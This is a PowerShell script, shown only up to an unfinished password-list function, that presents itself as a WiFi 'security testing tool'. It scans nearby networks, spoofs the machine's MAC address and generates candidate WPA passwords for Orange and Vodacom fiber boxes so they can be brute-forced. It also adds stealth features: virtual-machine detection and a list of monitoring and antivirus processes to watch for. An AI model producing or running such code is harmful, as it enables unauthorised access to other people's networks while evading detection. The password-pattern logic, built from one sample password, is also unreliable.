<#
.SYNOPSIS
    WiFi Security Testing Tool - Cross-Platform with MAC anonymization and security detection
    
.DESCRIPTION
    Professional WiFi security testing tool with Windows/Linux support, MAC spoofing,
    hostile environment detection, and intelligent password pattern generation for
    Orange and Vodacom fiber boxes
    
.PARAMETER Mode
    Execution mode: "standard", "stealth", "aggressive"
    
.PARAMETER DisableMacSpoof
    Disable MAC address changing
    
.PARAMETER SkipSecurityCheck
    Skip security environment checks
    
.PARAMETER HexPasswordCount
    Number of random hex passwords to generate
    
.PARAMETER PatternMode
    Enable pattern-based generation for Orange/Vodacom boxes
    
.EXAMPLE
    .\main.ps1 -Mode stealth -HexPasswordCount 10000 -PatternMode
#>

[CmdletBinding()]
param(
    [ValidateSet("standard", "stealth", "aggressive")]
    [string]$Mode = "standard",
    
    [switch]$DisableMacSpoof = $false,
    [switch]$SkipSecurityCheck = $false,
    [switch]$PatternMode = $true,
    [int]$HexPasswordCount = 5000
)

# Global Configuration
$script:CONFIG = @{
    PasswordLength = 8
    MaxPasswords = 100000
    Interface = $null
    InterfaceGUID = $null
    ScanTimeout = 10
    ConnectionTimeout = 3
    LogDirectory = if ($PSScriptRoot) { $PSScriptRoot } else { [System.IO.Path]::GetTempPath() }
    DebugMode = $false
    HexPasswordLength = 18
    HexBatchSize = 5000
    StealthMode = ($Mode -eq "stealth")
    AggressiveMode = ($Mode -eq "aggressive")
    PatternMode = $PatternMode
    IsWindows = ($env:OS -eq "Windows_NT" -or $IsWindows)
    IsLinux = ($IsLinux -or ($PSVersionTable.Platform -eq "Unix"))
    IsMacOS = $IsMacOS
    OriginalMac = $null
    SpoofedMac = $null
    SecurityCheckInterval = 30
    LastSecurityCheck = [DateTime]::MinValue
}

# ============================================
# CLASSES
# ============================================

<#
.SYNOPSIS
    Manages WiFi connection state and lifecycle
#>
class ConnectionStateManager {
    hidden [string]$Interface
    hidden [string]$InterfaceGUID
    hidden [string]$CurrentSSID
    hidden [System.Diagnostics.Stopwatch]$Timer
    hidden [string]$LogFile
    hidden [string]$DebugFile

    ConnectionStateManager([string]$interface, [string]$interfaceGUID, [string]$logFile, [string]$debugFile) {
        $this.Interface = $interface
        $this.InterfaceGUID = $interfaceGUID
        $this.Timer = [System.Diagnostics.Stopwatch]::new()
        $this.LogFile = $logFile
        $this.DebugFile = $debugFile
    }

    [void] PrepareForTesting() {
        try {
            Write-Log "Preparing interface for testing..." "DEBUG" $this.LogFile $this.DebugFile
            
            if ($script:CONFIG.IsWindows) {
                netsh wlan disconnect interface="$($this.Interface)" 2>$null | Out-Null
            } else {
                sudo nmcli device disconnect $this.Interface 2>$null | Out-Null
            }
            Start-Sleep -Milliseconds 200
        }
        catch {
            Write-Log "Failed to prepare for testing: $_" "ERROR" $this.LogFile $this.DebugFile
        }
    }

    [void] StartTimer() {
        $this.Timer.Restart()
    }

    [timespan] GetElapsedTime() {
        return $this.Timer.Elapsed
    }

    [void] CleanupConnection() {
        try {
            Write-Log "Cleaning up connection state..." "DEBUG" $this.LogFile $this.DebugFile
            
            if ($script:CONFIG.IsWindows) {
                netsh wlan disconnect interface="$($this.Interface)" 2>$null | Out-Null
            } else {
                sudo nmcli device disconnect $this.Interface 2>$null | Out-Null
            }
        }
        catch {
            Write-Log "Cleanup error: $_" "ERROR" $this.LogFile $this.DebugFile
        }
    }
}

<#
.SYNOPSIS
    Tracks password testing progress
#>
class ProgressTracker {
    hidden [DateTime]$StartTime
    hidden [int]$TotalPasswords
    hidden [int]$TestedPasswords
    hidden [System.Collections.Generic.List[double]]$SpeedHistory
    hidden [string]$LogFile
    hidden [string]$DebugFile
    hidden [bool]$IsComplete

    ProgressTracker([int]$total, [string]$logFile, [string]$debugFile) {
        $this.StartTime = Get-Date
        $this.TotalPasswords = $total
        $this.TestedPasswords = 0
        $this.SpeedHistory = [System.Collections.Generic.List[double]]::new()
        $this.LogFile = $logFile
        $this.DebugFile = $debugFile
        $this.IsComplete = $false
    }

    [void] UpdateProgress([string]$currentPassword) {
        $this.TestedPasswords++
        $elapsed = ([DateTime]::Now - $this.StartTime).TotalSeconds
        
        if ($elapsed -gt 0) {
            $speed = $this.TestedPasswords / $elapsed
            $this.SpeedHistory.Add($speed)
            
            if ($this.SpeedHistory.Count -gt 10) {
                $this.SpeedHistory.RemoveAt(0)
            }
        }

        $averageSpeed = ($this.SpeedHistory | Measure-Object -Average).Average
        $percentComplete = ($this.TestedPasswords / $this.TotalPasswords) * 100
        $remainingPasswords = $this.TotalPasswords - $this.TestedPasswords
        $estimatedSeconds = if ($averageSpeed -gt 0) { $remainingPasswords / $averageSpeed } else { 0 }
        $estimatedRemaining = [TimeSpan]::FromSeconds($estimatedSeconds)

        $progressParams = @{
            Activity = "Testing WiFi Passwords"
            Status = "Testing: $currentPassword"
            PercentComplete = [Math]::Min($percentComplete, 100)
            CurrentOperation = ("Speed: {0:N1} p/s | Remaining: {1:hh\:mm\:ss} | Progress: {2}/{3}" -f 
                $averageSpeed, $estimatedRemaining, $this.TestedPasswords, $this.TotalPasswords)
        }

        Write-Progress @progressParams
        Write-Log "Progress: $($this.TestedPasswords)/$($this.TotalPasswords)" "DEBUG" $this.LogFile $this.DebugFile
    }

    [void] Complete() {
        $this.IsComplete = $true
        Write-Progress -Activity "Testing WiFi Passwords" -Completed
    }

    [hashtable] GetStatistics() {
        $elapsed = ([DateTime]::Now - $this.StartTime).TotalSeconds
        $averageSpeed = ($this.SpeedHistory | Measure-Object -Average).Average

        return @{
            ElapsedTime = [TimeSpan]::FromSeconds($elapsed)
            TestedPasswords = $this.TestedPasswords
            AverageSpeed = $averageSpeed
            PercentComplete = ($this.TestedPasswords / $this.TotalPasswords) * 100
            RemainingPasswords = $this.TotalPasswords - $this.TestedPasswords
            IsComplete = $this.IsComplete
        }
    }
}

<#
.SYNOPSIS
    Generates hexadecimal passwords of specified length
#>
class HexPasswordGenerator {
    hidden [string]$Charset = "0123456789ABCDEF"
    hidden [int]$Length
    hidden [System.Random]$Random
    
    HexPasswordGenerator([int]$length) {
        $this.Length = $length
        $this.Random = [System.Random]::new()
    }
    
    [string] GenerateRandomHex() {
        $result = [System.Text.StringBuilder]::new($this.Length)
        for ($i = 0; $i -lt $this.Length; $i++) {
            $index = $this.Random.Next(0, 16)
            [void]$result.Append($this.Charset[$index])
        }
        return $result.ToString()
    }
    
    [System.Collections.Generic.List[string]] GenerateBatch([int]$count) {
        $batch = [System.Collections.Generic.HashSet[string]]::new([StringComparer]::OrdinalIgnoreCase)
        $maxAttempts = $count * 10
        $attempts = 0
        
        while ($batch.Count -lt $count -and $attempts -lt $maxAttempts) {
            $password = $this.GenerateRandomHex()
            [void]$batch.Add($password)
            $attempts++
        }
        
        return [System.Collections.Generic.List[string]]::new($batch)
    }
}

<#
.SYNOPSIS
    Security manager for detecting hostile environments
#>
class SecurityManager {
    hidden [string]$LogFile
    hidden [string]$DebugFile
    hidden [bool]$IsStealthMode
    
    SecurityManager([string]$logFile, [string]$debugFile, [bool]$stealthMode) {
        $this.LogFile = $logFile
        $this.DebugFile = $debugFile
        $this.IsStealthMode = $stealthMode
    }
    
    [hashtable] CheckEnvironment() {
        $results = @{
            IsSafe = $true
            Warnings = [System.Collections.Generic.List[string]]::new()
            CriticalIssues = [System.Collections.Generic.List[string]]::new()
        }
        
        try {
            # VM Detection
            $isVM = $this.DetectVirtualMachine()
            if ($isVM) {
                $results.Warnings.Add("Virtual machine detected")
                if ($this.IsStealthMode) {
                    $results.IsSafe = $false
                    $results.CriticalIssues.Add("VM detected in stealth mode")
                }
            }
            
            # Security software detection
            $securityProcesses = $this.DetectSecurityProcesses()
            if ($securityProcesses.Count -gt 0) {
                $results.Warnings.Add("Security software detected: $($securityProcesses -join ', ')")
            }
            
            Write-Log "Security check completed" "DEBUG" $this.LogFile $this.DebugFile
        }
        catch {
            Write-Log "Security check error: $_" "ERROR" $this.LogFile $this.DebugFile
        }
        
        return $results
    }
    
    hidden [bool] DetectVirtualMachine() {
        try {
            if ($script:CONFIG.IsWindows) {
                $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
                $manufacturer = $computerSystem.Manufacturer.ToLower()
                $model = $computerSystem.Model.ToLower()
                
                $vmIndicators = @("vmware", "virtualbox", "xen", "kvm", "hyper-v", "parallels", "qemu")
                foreach ($indicator in $vmIndicators) {
                    if ($manufacturer -like "*$indicator*" -or $model -like "*$indicator*") {
                        return $true
                    }
                }
            } else {
                $cpuinfo = Get-Content "/proc/cpuinfo" -ErrorAction SilentlyContinue
                if ($cpuinfo -match "hypervisor|vmware|kvm|qemu") { return $true }
            }
        }
        catch {
            Write-Log "VM detection error: $_" "DEBUG" $this.LogFile $this.DebugFile
        }
        return $false
    }
    
    hidden [System.Collections.Generic.List[string]] DetectSecurityProcesses() {
        $detected = [System.Collections.Generic.List[string]]::new()
        
        try {
            $securityProcessNames = @(
                "wireshark", "tcpdump", "processhacker", "procmon", 
                "fiddler", "burp", "nessus", "kaspersky", "mcafee", 
                "symantec", "norton", "avast", "avg"
            )
            
            $processes = Get-Process | Where-Object { 
                $securityProcessNames -contains $_.ProcessName.ToLower() 
            }
            
            foreach ($proc in $processes) {
                $detected.Add($proc.ProcessName)
            }
        }
        catch {
            Write-Log "Security process detection error: $_" "DEBUG" $this.LogFile $this.DebugFile
        }
        
        return $detected
    }
}

# ============================================
# UTILITY FUNCTIONS
# ============================================

<#
.SYNOPSIS
    Writes message to log files
#>
function Write-Log {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Message,
        [string]$Level = "INFO",
        [string]$LogFile,
        [string]$DebugFile
    )

    try {
        if ([string]::IsNullOrEmpty($LogFile) -or [string]::IsNullOrEmpty($DebugFile)) {
            $defaultPaths = Get-LogPaths
            $LogFile = if ($LogFile) { $LogFile } else { $defaultPaths.LogFile }
            $DebugFile = if ($DebugFile) { $DebugFile } else { $defaultPaths.DebugFile }
        }

        if ($Level -eq "DEBUG" -and -not $script:CONFIG.DebugMode) {
            return
        }

        $logDir = Split-Path $LogFile -Parent
        if (-not (Test-Path $logDir)) {
            New-Item -ItemType Directory -Path $logDir -Force | Out-Null
        }

        $logMessage = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') [$Level] $Message"

        if ($Level -eq "DEBUG" -and $script:CONFIG.DebugMode) {
            Add-Content -Path $DebugFile -Value $logMessage -ErrorAction Stop
        } elseif ($Level -ne "DEBUG") {
            Add-Content -Path $LogFile -Value $logMessage -ErrorAction Stop
        }

        switch ($Level) {
            "ERROR"   { Write-Host $logMessage -ForegroundColor Red }
            "WARNING" { Write-Host $logMessage -ForegroundColor Yellow }
            "SUCCESS" { Write-Host $logMessage -ForegroundColor Green }
            default   { }
        }
    }
    catch {
        Write-Host "Logging error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

<#
.SYNOPSIS
    Gets default log paths
#>
function Get-LogPaths {
    param([string]$SSID = "")
    
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $baseDir = $script:CONFIG.LogDirectory
    
    if ([string]::IsNullOrEmpty($SSID)) {
        $logDir = Join-Path $baseDir "logs"
    } else {
        $normalizedSSID = $SSID -replace '[^\w]', '_'
        $logDir = Join-Path $baseDir "logs\$normalizedSSID"
    }
    
    if (-not (Test-Path $logDir)) {
        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
    }
    
    return @{
        LogFile = Join-Path $logDir "scan_$timestamp.log"
        DebugFile = Join-Path $logDir "debug_$timestamp.log"
        PasswordFile = Join-Path $logDir "passwords_$timestamp.txt"
        SuccessFile = Join-Path $logDir "success_$timestamp.txt"
        WrongPasswordsFile = Join-Path $logDir "wrong_passwords.txt"
        Timestamp = $timestamp
    }
}

<#
.SYNOPSIS
    Checks for administrator/root rights
#>
function Test-AdminRights {
    if ($script:CONFIG.IsWindows) {
        $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } else {
        return ((id -u) -eq 0)
    }
}

<#
.SYNOPSIS
    Detects execution environment (Windows/Linux/macOS)
#>
function Get-EnvironmentInfo {
    $info = @{
        OS = "Unknown"
        Version = $PSVersionTable.PSVersion.ToString()
        IsAdmin = Test-AdminRights
        PowerShellVersion = $PSVersionTable.PSVersion.Major
    }
    
    if ($script:CONFIG.IsWindows) {
        $info.OS = "Windows"
        $info.WindowsVersion = [System.Environment]::OSVersion.VersionString
    } elseif ($script:CONFIG.IsLinux) {
        $info.OS = "Linux"
        if (Test-Path "/etc/os-release") {
            $osInfo = Get-Content "/etc/os-release" | ConvertFrom-StringData
            $info.Distribution = $osInfo.PRETTY_NAME
        }
    } elseif ($script:CONFIG.IsMacOS) {
        $info.OS = "macOS"
    }
    
    return $info
}

<#
.SYNOPSIS
    Changes MAC address (MAC spoofing)
#>
function Set-MacAddress {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Interface,
        [string]$NewMac = $null,
        [switch]$RestoreOriginal = $false
    )
    
    $adapter = Get-NetAdapter | Where-Object Name -eq $Interface
    if (-not $adapter) {
        Write-Host "Adapter not found: $Interface" -ForegroundColor Red
        return $false
    }

    # Determine target MAC
    if ($RestoreOriginal -and $script:CONFIG.OriginalMac) {
        $targetMac = $script:CONFIG.OriginalMac
        Write-Host "Restoring original MAC: $targetMac" -ForegroundColor Yellow
    } elseif ($NewMac) {
        $targetMac = $NewMac
    } else {
        $random = [System.Random]::new()
        $bytes = [byte[]]::new(6)
        $random.NextBytes($bytes)
        $bytes[0] = [byte](($bytes[0] -band 0xFE) -bor 0x02)
        $targetMac = ($bytes | ForEach-Object { $_.ToString("X2") }) -join ":"
    }

    Write-Host "Attempting to change MAC to: $targetMac" -ForegroundColor Cyan

    if ($script:CONFIG.IsWindows) {
        try {
            # 1. CHECK REGISTRY KEY BEFORE DISABLING INTERFACE
            Write-Host "Searching registry key..." -ForegroundColor Gray
            $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Class\{4D36E972-E325-11CE-BFC1-08002BE10318}"
            $subKeys = Get-ChildItem $regPath -ErrorAction SilentlyContinue | Where-Object { 
                $props = Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue
                $props -and $props.NetCfgInstanceId -eq $adapter.InterfaceGuid 
            }

            if (-not $subKeys) {
                throw "Could not find registry key for this adapter. Your network card may not support MAC spoofing."
            }

            # Handle case where multiple keys found
            $targetKeyPath = if ($subKeys -is [array]) { $subKeys[0].PSPath } else { $subKeys.PSPath }

            # 2. DISABLE INTERFACE
            Write-Host "Disabling interface..." -ForegroundColor Yellow
            Disable-NetAdapter -Name $Interface -Confirm:$false
            Start-Sleep -Seconds 2

            # 3. MODIFY REGISTRY
            Write-Host "Modifying registry..." -ForegroundColor Gray
            New-ItemProperty -Path $targetKeyPath -Name "NetworkAddress" -Value $targetMac.Replace(":", "") -PropertyType String -Force -ErrorAction Stop | Out-Null
            Write-Log "Registry updated with new MAC" "DEBUG"

            # 4. RE-ENABLE INTERFACE
            Write-Host "Re-enabling interface..." -ForegroundColor Yellow
            Enable-NetAdapter -Name $Interface -Confirm:$false

            # Wait for adapter to be fully up
            Write-Host "Waiting for initialization..." -ForegroundColor Yellow
            $timeout = 30
            $elapsed = 0
            while ($elapsed -lt $timeout) {
                Start-Sleep -Seconds 1
                $status = Get-NetAdapter -Name $Interface | Select-Object -ExpandProperty Status
                if ($status -eq "Up") {
                    Write-Host "Adapter ready!" -ForegroundColor Green
                    break
                }
                $elapsed++
                Write-Host "  Waiting... ($elapsed/$timeout)" -ForegroundColor Gray
            }

            if ($elapsed -ge $timeout) {
                throw "Adapter failed to come up within timeout period."
            }

            Start-Sleep -Seconds 3
            $script:CONFIG.SpoofedMac = $targetMac
            Write-Log "MAC changed successfully" "SUCCESS"
            return $true

        } catch {
            Write-Log "Failed to change MAC: $_" "ERROR"
            Write-Host "Failed to change MAC. Attempting to restore interface..." -ForegroundColor Red
            
            # RECOVERY BLOCK
            try {
                Enable-NetAdapter -Name $Interface -Confirm:$false -ErrorAction SilentlyContinue
                Start-Sleep -Seconds 5
                Write-Host "Interface re-enabled successfully." -ForegroundColor Green
            } catch {
                Write-Host "CRITICAL: Could not automatically re-enable adapter. A restart may be required." -ForegroundColor Red
            }
            
            return $false
        }
    } else {
        # Linux
        try {
            $macchanger = Get-Command macchanger -ErrorAction SilentlyContinue
            $ip = Get-Command ip -ErrorAction SilentlyComplete
            
            if ($macchanger) {
                sudo ip link set $Interface down
                Start-Sleep -Seconds 1
                sudo macchanger -m $targetMac $Interface
                sudo ip link set $Interface up
            } elseif ($ip) {
                sudo ip link set $Interface down
                Start-Sleep -Seconds 1
                sudo ip link set $Interface address $targetMac
                sudo ip link set $Interface up
            } else {
                throw "macchanger or ip command not found"
            }
            Start-Sleep -Seconds 5
            $script:CONFIG.SpoofedMac = $targetMac
            Write-Log "MAC address changed successfully" "SUCCESS"
            return $true
        } catch {
            Write-Log "Failed to change MAC: $_" "ERROR"
            return $false
        }
    }
}

<#
.SYNOPSIS
    Saves original MAC address
#>
function Save-OriginalMac {
    param([string]$Interface)
    
    try {
        if ($script:CONFIG.IsWindows) {
            $adapter = Get-NetAdapter | Where-Object Name -eq $Interface
            if ($adapter) {
                $script:CONFIG.OriginalMac = $adapter.MacAddress
                Write-Log "Original MAC saved: $($adapter.MacAddress)" "DEBUG"
            }
        } else {
            $mac = cat "/sys/class/net/$Interface/address" 2>$null
            if ($mac) {
                $script:CONFIG.OriginalMac = $mac.Trim()
                Write-Log "Original MAC saved: $mac" "DEBUG"
            }
        }
    }
    catch {
        Write-Log "Could not save original MAC: $_" "WARNING"
    }
}

<#
.SYNOPSIS
    Selects network adapter (cross-platform)
#>
function Select-NetworkAdapter {
    try {
        $adapters = @()
        
        if ($script:CONFIG.IsWindows) {
            $adapters = @(Get-NetAdapter | Where-Object { 
                $_.MediaType -eq "Native 802.11" -or $_.MediaType -eq "802.11"
            } | ForEach-Object {
                [PSCustomObject]@{
                    Name = $_.Name
                    Description = $_.InterfaceDescription
                    Status = $_.Status
                    MacAddress = $_.MacAddress
                    GUID = $_.InterfaceGuid
                    Index = $_.InterfaceIndex
                }
            })
        } else {
            $wirelessInterfaces = iw dev 2>$null | Select-String "Interface" | ForEach-Object { 
                ($_ -split "\s+")[1] 
            }
            
            if (-not $wirelessInterfaces) {
                $wirelessInterfaces = iwconfig 2>$null | Select-String "IEEE 802.11" | ForEach-Object { 
                    ($_ -split "\s+")[0] 
                }
            }
            
            foreach ($iface in $wirelessInterfaces) {
                $mac = cat "/sys/class/net/$iface/address" 2>$null
                $operstate = cat "/sys/class/net/$iface/operstate" 2>$null
                
                $adapters += [PSCustomObject]@{
                    Name = $iface
                    Description = "Wireless Interface"
                    Status = if ($operstate -eq "up") { "Up" } else { "Down" }
                    MacAddress = $mac.Trim()
                    GUID = $iface
                    Index = $iface
                }
            }
        }

        if ($adapters.Count -eq 0) {
            Write-Host "`nNo wireless adapters found!" -ForegroundColor Red
            return $null
        }

        Write-Host "`nAvailable Wireless Adapters:" -ForegroundColor Cyan
        for ($i = 0; $i -lt $adapters.Count; $i++) {
            $statusColor = if ($adapters[$i].Status -eq "Up") { "Green" } else { "Yellow" }
            Write-Host "[$i] $($adapters[$i].Name) - $($adapters[$i].Description) [$($adapters[$i].Status)]" -ForegroundColor $statusColor
            Write-Host "    MAC: $($adapters[$i].MacAddress)"
        }

        do {
            $selection = Read-Host "`nSelect adapter (0-$($adapters.Count - 1))"
            if ($selection -match '^\d+$' -and [int]$selection -ge 0 -and [int]$selection -lt $adapters.Count) {
                return $adapters[[int]$selection]
            }
            Write-Host "Invalid selection." -ForegroundColor Red
        } while ($true)
        
    }
    catch {
        Write-Host "Error selecting adapter: $_" -ForegroundColor Red
        return $null
    }
}

<#
.SYNOPSIS
    Gets available WiFi networks (cross-platform)
#>
function Get-WifiNetworks {
    param(
        [string]$LogFile, 
        [string]$DebugFile
    )
    
    try {
        Write-Log "Scanning for networks..." "INFO" $LogFile $DebugFile
        
        $networks = [System.Collections.Generic.List[hashtable]]::new()
        
        if ($script:CONFIG.IsWindows) {
            Write-Host "`nScanning WiFi networks... Please wait..." -ForegroundColor Yellow
            
            # Multiple scan attempts
            $scanAttempts = 0
            $maxAttempts = 5
            $rawOutput = ""
            
            while ($scanAttempts -lt $maxAttempts) {
                $null = netsh wlan scan interface="$($script:CONFIG.Interface)" 2>&1
                Start-Sleep -Seconds 3
                
                $rawOutput = netsh wlan show networks interface="$($script:CONFIG.Interface)" mode=Bssid 2>&1
                
                if ($rawOutput -match "SSID\s+\d+\s*:") {
                    Write-Log "Scan successful on attempt $($scanAttempts + 1)" "DEBUG" $LogFile $DebugFile
                    break
                }
                
                $scanAttempts++
                Write-Log "Scan attempt $scanAttempts returned no results, retrying..." "WARNING" $LogFile $DebugFile
                Write-Host "  Scan attempt $scanAttempts failed, retrying..." -ForegroundColor Gray
            }
            
            if ($scanAttempts -ge $maxAttempts) {
                Write-Log "All scan attempts failed. No networks found." "WARNING" $LogFile $DebugFile
                return $null
            }
            
            Write-Log "Raw netsh output captured" "DEBUG" $LogFile $DebugFile
            
            $currentNetwork = $null
            $lineNumber = 0
            
            foreach ($line in $rawOutput) {
                $lineNumber++
                $trimmedLine = $line.Trim()
                
                if ([string]::IsNullOrWhiteSpace($trimmedLine)) { continue }
                
                Write-Log "Processing line $lineNumber : $trimmedLine" "DEBUG" $LogFile $DebugFile
                
                if ($trimmedLine -match "^SSID\s+\d+\s*:\s*(.+)$") {
                    if ($currentNetwork -and -not [string]::IsNullOrWhiteSpace($currentNetwork.SSID)) { 
                        [void]$networks.Add($currentNetwork)
                        Write-Log "Added network: $($currentNetwork.SSID) (Signal: $($currentNetwork.Signal)%, Security: $($currentNetwork.Security))" "DEBUG" $LogFile $DebugFile
                    }
                    
                    $ssidName = $matches[1].Trim()
                    $ssidName = $ssidName -replace '[\x00-\x1F\x7F]', ''
                    
                    $currentNetwork = @{
                        SSID = $ssidName
                        Security = "Unknown"
                        Signal = 0
                        BSSID = ""
                        Authentication = ""
                        Encryption = ""
                        NetworkType = ""
                    }
                    
                    Write-Log "Found SSID: $ssidName" "DEBUG" $LogFile $DebugFile
                }
                elseif ($currentNetwork) {
                    if ($trimmedLine -match "Authentication\s*:\s*(.+)" -or 
                        $trimmedLine -match "Authentification\s*:\s*(.+)") {
                        $currentNetwork.Authentication = $matches[1].Trim()
                        $currentNetwork.Security = $matches[1].Trim()
                    }
                    elseif ($trimmedLine -match "Cipher\s*:\s*(.+)" -or 
                            $trimmedLine -match "Chiffrement\s*:\s*(.+)") {
                        $currentNetwork.Encryption = $matches[1].Trim()
                    }
                    elseif ($trimmedLine -match "Signal\s*:\s*(\d+)") {
                        $currentNetwork.Signal = [int]$matches[1].Trim()
                    }
                    elseif ($trimmedLine -match "Network type\s*:\s*(.+)" -or
                            $trimmedLine -match "Type de réseau\s*:\s*(.+)") {
                        $currentNetwork.NetworkType = $matches[1].Trim()
                    }
                    elseif ($trimmedLine -match "BSSID\s+\d+\s*:\s*([0-9a-fA-F:]+)") {
                        $currentNetwork.BSSID = $matches[1].Trim()
                    }
                }
            }
            
            if ($currentNetwork -and -not [string]::IsNullOrWhiteSpace($currentNetwork.SSID)) { 
                [void]$networks.Add($currentNetwork)
                Write-Log "Added final network: $($currentNetwork.SSID)" "DEBUG" $LogFile $DebugFile
            }
            
        } else {
            $interface = $script:CONFIG.Interface
            if (-not $interface) { $interface = "wlan0" }
            
            if ($interface -notmatch '^[a-zA-Z0-9_\-]+$') {
                throw "Invalid interface name detected: '$interface'. Allowed characters: a-z, A-Z, 0-9, _, -"
            }
            
            Write-Host "Scanning on Linux interface: $interface" -ForegroundColor Yellow
            
            $scanOutput = sudo iw dev $interface scan 2>$null | Out-String
            
            if (-not $scanOutput) {
                $scanOutput = sudo iwlist $interface scan 2>$null | Out-String
            }
            
            if ($scanOutput) {
                $cells = $scanOutput -split "(?=(BSS|Cell) [0-9a-f]{2}:)"
                foreach ($cell in $cells) {
                    if ($cell -match "SSID:\s*(.+)") {
                        $ssid = $matches[1].Trim()
                        
                        if ([string]::IsNullOrWhiteSpace($ssid) -or $ssid -eq "\x00" -or $ssid -eq "\x00\x00\x00") {
                            continue
                        }
                        
                        $signal = 0
                        if ($cell -match "signal:\s*(-?\d+(\.\d+)?)") {
                            $signalDbm = [decimal]$matches[1]
                            $signal = [Math]::Min(100, [Math]::Max(0, 2 * ($signalDbm + 100)))
                        }
                        
                        $security = "Open"
                        if ($cell -match "RSN") { $security = "WPA2" }
                        elseif ($cell -match "WPA") { $security = "WPA" }
                        
                        [void]$networks.Add(@{
                            SSID = $ssid
                            Security = $security
                            Signal = [int]$signal
                            BSSID = ""
                            Authentication = $security
                            Encryption = ""
                            NetworkType = "Infrastructure"
                        })
                    }
                }
            }
        }
        
        $filteredNetworks = @($networks | Where-Object { 
            -not [string]::IsNullOrWhiteSpace($_.SSID) -and
            $_.SSID -ne "\x00" -and
            $_.Signal -ge 1
        } | Sort-Object -Property Signal -Descending)
        
        Write-Log "Found $($filteredNetworks.Count) valid networks" "INFO" $LogFile $DebugFile
        
        return $filteredNetworks
        
    }
    catch {
        Write-Log "Scan failed: $_" "ERROR" $LogFile $DebugFile
        Write-Log "Stack trace: $($_.ScriptStackTrace)" "DEBUG" $LogFile $DebugFile
        return $null
    }
}

<#
.SYNOPSIS
    Generates pattern-based passwords for Orange/Vodacom boxes
    Based on analysis of password: 2TFG3AQ72NZH5CCAGX
#>
function Generate-OrangeVodacomPatterns {
    $patterns = [System.Collections.Generic.List[string]]::new()
    
    # Analysis of known Orange Fiber password: 2TFG3AQ72NZH5CCAGX
    # Structure: [Digit][3xUpper][Digit][2xUpper][2xDigit][3xUpper][Digit][2xUpper][2xUpper]
    # This appears to be Base36 encoded serial number
    
    # Orange Livebox patterns (MAC-based prefixes)
    $orangePrefixes = @("2TFG", "2TFH", "2TFJ", "3AFG", "2UFG", "A4B8", "001F", "0024")
    $orangeMiddles = @("3AQ7", "3AR7", "3BQ7", "4AQ7", "3AP7", "3AQ8")
    $orangeCenters = @("2NZH", "2NZJ", "2NYH", "3NZH", "2NZG", "2MZH")
    $orangeSuffixes = @("5CCAGX", "5CCAGY", "5CDAGX", "5CCAHX", "5CCAGZ", "5DCAGX")
    
    # Generate combinations
    foreach ($pre in $orangePrefixes) {
        foreach ($mid in $orangeMiddles) {
            foreach ($cen in $orangeCenters) {
                foreach ($suf in $orangeSuffixes) {
                    [void]$patterns.Add("$pre$mid$cen$suf")
                }
            }
        }
    }
    
    # Vodacom patterns (different structure, often more numeric)
    $vodacomPrefixes = @("001D0F", "0022CF", "001E58", "002147", "C0A0BB", "001D0E")
    foreach ($prefix in $vodacomPrefixes) {
        # Generate 12-character suffix variations
        for ($i = 0; $i -lt 50; $i++) {
            $suffix = -join ((48..57) + (65..70) | Get-Random -Count 12 | ForEach-Object { [char]$_ })
            [void]$patterns.Add("$prefix$suffix")
        }
    }
    
    # Base36 patterns (alphanumeric beyond just hex)
    $base36Chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for ($i = 0; $i -lt 100; $i++) {
        $pass = -join (1..18 | ForEach-Object { $base36Chars[(Get-Random -Maximum 36)] })
        [void]$patterns.Add($pass)
    }
    
    # Patterns with double characters (observed in 2TFG3AQ72NZH5CCAGX: two 2's, two A's, CC)
    $doublePatterns = @(
        "2[A-Z]{3}3[A-Z]{2}72[A-Z]{3}5[A-Z]{2}GX",
        "2[A-Z]{2}G3[A-Z]Q7[A-Z]NZH5[A-Z]{2}AGX",
        "3[A-Z]{3}4[A-Z]{2}83[A-Z]{3}6[A-Z]{2}HY",
        "1[A-Z]{3}2[A-Z]{2}91[A-Z]{3}4[A-Z]{2}KZ"
    )
    
    foreach ($pattern in $doublePatterns) {
        # Generate variations by replacing [A-Z] with actual letters
        for ($i = 0; $i -lt 20; $i++) {
            $actual = $pattern
            while ($actual -match '\[A-Z\]') {
                $char = [char](65 + (Get-Random -Maximum 26))
                $actual = $actual -replace '\[A-Z\]', $char, 1
            }
            [void]$patterns.Add($actual)
        }
    }
    
    # Year-based patterns (manufacturing dates)
    $years = @("2022", "2023", "2024")
    $months = @("01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12")
    foreach ($year in $years) {
        foreach ($month in $months) {
            # YYMM + 14 random hex chars
            $suffix = -join ((48..57) + (65..70) | Get-Random -Count 14 | ForEach-Object { [char]$_ })
            [void]$patterns.Add(($year.Substring(2,2) + $month + $suffix))
        }
    }
    
    # Common hex sequences found in ISP routers
    $commonSequences = @(
        "1234567890ABCDEF01", "0987654321FEDCBA09",
        "ABCDEF1234567890AB", "FEDCBA0987654321FE",
        "0123456789ABCDEF01", "FEDCBA9876543210FE",
        "AABBCCDDEEFF001122", "112233445566778899",
        "001122334455667788", "887766554433221100"
    )
    
    foreach ($seq in $commonSequences) {
        [void]$patterns.Add($seq)
        # Add variations with different prefixes/suffixes
        [void]$patterns.Add("00$seq")
        [void]$patterns.Add("$seq`00")
    }
    
    return $patterns
}

<#
.SYNOPSIS
    Generates password list with 18-character hex and Orange/Vodacom patterns
#>
function Generate-PasswordList {
    param(
        [string]$SSID,
        [string]$LogFile,
        [string]$DebugFile,
        $WrongPasswords,
        [int]$HexCount = 5000
    )
    
    Write-Log "Generating password list..." "INFO" $LogFile $DebugFile
    
    $passwords = [System.Collections.Generic.List[string]]::new()
    
    # Generate 18-character random hex passwords
    Write-Log "Generating $HexCount random hex passwords (18 chars)..." "INFO" $LogFile $DebugFile
    
    $generator = [HexPasswordGenerator]::new($script:CONFIG.HexPasswordLength)
    $hexBatch = $generator.GenerateBatch($HexCount)
